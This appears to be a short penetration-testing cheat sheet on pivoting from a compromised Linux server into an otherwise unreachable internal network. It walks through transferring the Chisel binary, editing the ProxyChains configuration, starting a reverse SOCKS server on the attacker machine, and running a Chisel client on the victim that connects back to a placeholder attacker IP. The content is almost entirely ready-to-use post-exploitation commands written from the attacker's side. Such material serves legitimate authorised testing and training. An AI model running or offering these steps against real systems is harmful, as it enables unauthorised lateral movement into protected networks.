## Scenario

- You have compromised Linux Server
- Linux Server have access to another network that your attacker machine can't access
- We will setup a Tunnel using Chisel and use ProxyChains to use that tunnel for forwarding traffic to unaccessible network

## Required Components

- Shell Access on the compromised Linux Server

---

1. Download Chisel binary from following Github Repo

```bash
https://github.com/jpillora/chisel/releases
```

2. Transfer Binary to compromised Linux Server

```bash
python3 -m http.server 80
```

3. On Attacker Machine edit /etc/proxychains4.conf and follwoing line at the end of the file

```bash
nano /etc/proxychains4.conf
```
```bash
socks5 127.0.0.1 1080
```

4. On Attacker Machine start Chisel server with Socks5

```bash
./chisel server --socks5 -p 9001 -reverse
```

5. On Compromised Linux Server start Chisel client

```bash
./chisel client <Attacker IP>:9001 R:socks
```
